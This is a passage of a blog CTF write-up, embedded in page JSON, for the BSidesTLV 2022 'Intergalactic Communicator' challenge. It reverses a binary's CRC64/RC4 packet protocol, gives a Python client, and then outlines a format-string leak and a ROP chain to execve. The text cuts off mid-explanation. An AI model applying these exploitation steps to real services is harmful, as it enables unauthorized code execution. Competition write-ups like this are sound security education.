{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var r=Object.create;var c=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var i=a=>c(a,\"__esModule\",{value:!0});var m=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),k=(a,s)=>{i(a);for(var t in s)c(a,t,{get:s[t],enumerable:!0})},N=(a,s,t)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let e of d(s))!u.call(a,e)&&e!==\"default\"&&c(a,e,{get:()=>s[e],enumerable:!(t=p(s,e))||t.enumerable});return a},f=a=>N(i(c(a!=null?r(h(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=m((v,l)=>{l.exports=_jsx_runtime});var y={};k(y,{default:()=>g,frontmatter:()=>b});var n=f(o()),b={title:\"BSidesTLV 2022 CTF \\u2013 Intergalactic Communicator\",date:\"2022-06-30\",draft:!1,authors:[\"thebadgod\"],tags:[\"BSidesTLV 2022\",\"pwn\",\"reverse\",\"rc4\"],summary:\"pwn too easy, rev cancer.\",canonical:\"https://spclr.ch/bsidestlv2022-writeups\"};function w(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(t,{})})):t();function t(){let e=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",code:\"code\",h3:\"h3\",pre:\"pre\",ul:\"ul\",li:\"li\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h2,{id:\"intergalactic-communicator-500\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#intergalactic-communicator-500\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Intergalactic Communicator (500)\"]}),`\n`,(0,n.jsxs)(e.p,{children:[`We get a tar gz archive with a docker container inside (An archived docker\ncontainer), the main thing inside we are interested in is the binary running\non the remote, so we either import the docker container or extract the layers\nuntil we find the binary in `,(0,n.jsx)(e.code,{children:\"/usr/src/app/main\"}),\".\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"part-1-reversing\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#part-1-reversing\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Part 1: Reversing\"]}),`\n`,(0,n.jsxs)(e.h3,{id:\"header--checksum\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#header--checksum\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Header & checksum\"]}),`\n`,(0,n.jsx)(e.p,{children:`The binary inside the docker container is statically compiled and stripped,\nso it must be a hard challenge (as it turns out it actually isn't, it's just\ncancerous).`}),`\n`,(0,n.jsxs)(e.p,{children:[`We start at the function start (entrypoint) inside the binary, this calls\n`,(0,n.jsx)(e.code,{children:\"libc_start_main\"}),`, where the first argument is the main function, going into\nthat we see that it runs an infinite loop and if it breaks it prints\n\"invalid packet\", making an educated guess and saying that that function\nprobably is `,(0,n.jsx)(e.code,{children:\"fwrite\"}),\", the next one after that probably is \",(0,n.jsx)(e.code,{children:\"exit\"}),`, then\nthere are only three more functions, the first of which looks like a memset\ncall, to set a buffer of size 2048 to zero, the second one looks like fread\n(Again looking at the arguments and seeing the stdin in fourth place).`]}),`\n`,(0,n.jsx)(e.p,{children:`So we read four bytes, put that into a variable, then swap the endianess\nof said variable, if that value is now less than 12 we print \"invalid\nprotocol header\", so we have 12 bytes of header data, next we read the\namount of bytes specified by our input. So this input must have been\nthe packet length, the rest of the data is the payload.`}),`\n`,(0,n.jsxs)(e.p,{children:[`This also means the last remaining function is the function responsible\nfor handling the packet data, it gets the packet data and its size.\nIn that function we load the first eight bytes of the data, xor it\nwith two different values and store those in a 16 byte buffer (The constants\nspell out `,(0,n.jsx)(e.code,{children:\"NotFlag!\"}),\" and \",(0,n.jsx)(e.code,{children:\"JustKey!\"}),` respectively, so I name the buffer key).\nnext we call a function where we give this buffer as first argument, then\nthe packet data (after the first eight bytes), then 16 and finally the packet\nlength minus eight. So we are entering the key and data and their sizes.`]}),`\n`,(0,n.jsx)(e.p,{children:`Looking at that function we see a few assertions (including file name, line\nnumber and function name & arguments), so we can already name all of those.\nIf you've ever reversed malware (or some \"secure\" c2 server), this encryption\nmight look familiar, as it is just doing rc4 encryption. It mallocs a new buffer\nfor the output and returns a pointer to that.`}),`\n`,(0,n.jsx)(e.p,{children:`Back in the function handling the packet we call memset on the packet data again,\nthen a function which takes the packet data pointer, the decrypted data pointer\nand the size of the data, so this is probably just a memcpy. Then we clear the\nallocated buffer and call free on it (Actually I didn't reverse that function, I\nagain just guessed it probably is free, since we don't use the buffer afterwards).`}),`\n`,(0,n.jsxs)(e.p,{children:[`Next we have an if which checks that the output of a function, which takes the\ndata and its size, is equal to the first eight bytes of the packet - which we\nused as the key for the decryption. If the check fails, we print \"checksum failed\"\nand exit, so this makes it pretty clear that we're using some sort of checksum.\nLooking at the function we see that there is a lookuptable. Googling the first\n(nonzero) constant in that table leads us to the crc64 implementation of\nredis which looks exactly like the implementation we got. So either we implement\nthis in python or we write the exploit in C and use this implementation...\nOr we just use pwntools `,(0,n.jsx)(e.code,{children:\"generic_crc\"}),` which will work the same as this implementation\nby just giving it the arguments which are defined at the top of the redis\nimplementation.`]}),`\n`,(0,n.jsxs)(e.p,{children:[`Next, if the checksum was correct, the packet data (without the checksum header)\nis passed into another function, which then first takes an int from the data\n(Finalizing the header) and performs a switch on the value of that, there\nare five actions we can perform, it seems that the first one just prints a\nnumber, so we change the function call with the format specified to `,(0,n.jsx)(e.code,{children:\"sprintf\"}),`,\nthe buffer we write into is used after the switch, first we put it into a\nfunction which returns an int, which we send to the other side using fwrite,\nthen we pass the buffer into a second function. This looks like we're just\nsending the size of the buffer and then the buffer, so I rename the functions\nto `,(0,n.jsx)(e.code,{children:\"strlen\"}),\" and \",(0,n.jsx)(e.code,{children:\"write_buffer\"}),\" and the buffer to \",(0,n.jsx)(e.code,{children:\"output_data\"}),` respectively.\n(I ignored the first if case in the function as it had to with futexes and\nthose are rarely important).`]}),`\n`,(0,n.jsxs)(e.h3,{id:\"api\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#api\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"API\"]}),`\n`,(0,n.jsx)(e.p,{children:`So now we know how to communicate (and we can already write a script to\ncommunicate which just sends packets and receives the answer), however\nthe interesting part starts now as we have to reverse the actual part\nwe can interact with, so let's look at the switch.`}),`\n`,(0,n.jsx)(e.p,{children:`The first case just returns a numberm which is the result of a function\ncall with an object which seems to be referenced a lot.`}),`\n`,(0,n.jsxs)(e.p,{children:[`The second case takes another int from the input data, puts it into\na function together with the weird object. Then we call a function\nwhich just dereferences the returned value. Venturing a bit into the\nfirst function we find the string `,(0,n.jsx)(e.code,{children:\"vector::_M_range_check\"}),`, which means\nthe object is likely just a vector and judging by the arguments this is\nprobably just the `,(0,n.jsx)(e.code,{children:\"operator[]\"}),`, the returned value is dereferenced, which\nleads me to believe that it's a c++ string and we called the `,(0,n.jsx)(e.code,{children:\"c_str\"}),` method\non it. Considering this, we now can make a guess about the first case in\nthe switch, that being it's just getting the size of the vector.\nNext we call `,(0,n.jsx)(e.code,{children:\"snprintf\"}),` (again based on the arguments), into a temporary\nbuffer, then we call some other method which again calls printf??\nYes as it looks like the temporary buffer is used as the format for\na printf to the output buffer... Well, if that's not handy...`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The next case takes the rest of the buffer as a string (\",(0,n.jsx)(e.code,{children:\"char*\"}),`) and\ncalls another function with it, which probably means it's inserting\nthat into the list. Then we get the iterator and end iterator of that\nreturned string, then we clear the topmost bit of every char along the\nway (We iterate over all the chars we just put into the string)\nThis is likely to limit us to ascii-only values, but we'll see about that`]}),`\n`,(0,n.jsx)(e.p,{children:`The fourth case just calls a function and returns \"OK\", my guess was this\nclears the list and with a bit of experimenting that seemed to be the\ncase (not that I had to use this functionality)`}),`\n`,(0,n.jsx)(e.p,{children:`The last case is again using an iterator, this time over the string in the\nlist, and it just concatenates them all into a giant string, which is\non the stack... In a buffer of size 2048... Where every string can\nhave up to 2048 chars... So yeah, this could be used to overflow the stack\nquite a bit.`}),`\n`,(0,n.jsxs)(e.h3,{id:\"implementation\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#implementation\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Implementation\"]}),`\n`,(0,n.jsx)(e.p,{children:\"I implemented this protocol client in python:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" arc4 \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` ARC4\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"class\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"Comm\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    crc64 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"lambda\"}),\" x\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" crc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"generic_crc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"polynom\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xad93d23594c935a9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"width\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"64\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"refin\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"refout\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"xorout\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"init\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"x\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__init__\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` r\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"send_packet\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        checksum \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" Comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"crc64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        key \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"checksum \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x2167616C46746F4E\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"checksum \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x2179654B7473754A\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        rc4 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ARC4\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"key\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" rc4\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encrypt\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        totransmit \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" endian\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"big\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"checksum\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),` data\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"totransmit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"recv_packet\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        length \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"length\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` data\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"size\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"get\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" optional\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"None\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" optional\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            optional \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'b\"\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" optional\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"clear\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"broadcast\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:`To use this class you have to give it a pwntools pipe as constructor argument\nand then you can call the individual functions (Not that I only added\nthe optional packet data into the get method, but you could put that in\nall the methods, I only needed it in the get function)`}),`\n`,(0,n.jsxs)(e.h2,{id:\"part-2-pwn\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#part-2-pwn\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Part 2: Pwn\"]}),`\n`,(0,n.jsx)(e.p,{children:`The year is 2022 AD, Strings are entirely ascii. Well not entirely! One small\npart of memory still holds out against the ascii-fication.`}),`\n`,(0,n.jsx)(e.p,{children:`Well, first of all we want to leak data, like the aslr base and the stack\ncookie, as well as the stack address (We might not need it, but I mean, why not)`}),`\n`,(0,n.jsxs)(e.p,{children:[\"To do this we just add a string with the text \",(0,n.jsx)(e.code,{children:\"%529$p %533$p %532$p\"}),`, then\nprint that string using the get method. We get these numbers by taking the\nsize of the stack frame (0x1078), dividing that by eight and then adding six\n(The first six arguments are in registers, and on the stack every argument\nis eight bytes). That is the pointer to the saved return address, just before\nthat is the saved rbp, and for some reason 3 spaces further back is the stack\ncookie.`]}),`\n`,(0,n.jsx)(e.p,{children:`Now with these values we can just rop, right? Well yes, but actually no,\nbut actually actually yes.`}),`\n`,(0,n.jsx)(e.p,{children:`The author made all the strings ascii-only, so we would have had to wait\nfor the stack cookie and the aslr base to be ascii-only for an exploit,\nwhich seemed unrealistic, so I scrapped that idea (Which was the intended\nsolution btw...), then I noticed that the decrypted buffer is copied from\nthe heap onto the stack (for some reason) before it's being processed.\nWhich means we have all the binary values of the current packet on the stack,\nor if we haven't overwritten them the previous ones.`}),`\n`,(0,n.jsxs)(e.p,{children:[`Which means instead of looking at the current stack frame we look a bit further\nup in the stack frame of main and voil\\xE0, we find the values we are looking for,\nluckily pwntools not only has the function `,(0,n.jsx)(e.code,{children:\"fmtstr_payload\"}),`, but also\n`,(0,n.jsx)(e.code,{children:\"fmtstr_split\"}),\", which returns the format string and the binary data required.\"]}),`\n`,(0,n.jsx)(e.p,{children:`So after leaking the values, we can continue to create a ropchain (pwntools\nactually worked here, so just do a call to execve, don't forget to set the base\nstack address).\nNext we somehow want the thing to jump to our payload, so we make a formatstring\npayload which uses the binary data in the packet and overwrites the return address\nwith a ropgadget to increase the stack pointer (So it ends up in our buffer)`}),`\n`,(0,n.jsx)(e.p,{children:`Next we just add the format, then get the string (which executes the vulnerability),\nwith optional data being set to the formatstring payload and the ropchain.`}),`\n`,(0,n.jsx)(e.p,{children:`There are some magic values, but they're not really that magic, the base\nstack address is just calculated, since we have two returns and the gadget\nincreases the stack address by 0x78, we have a total of 0x88 bytes,\nthe 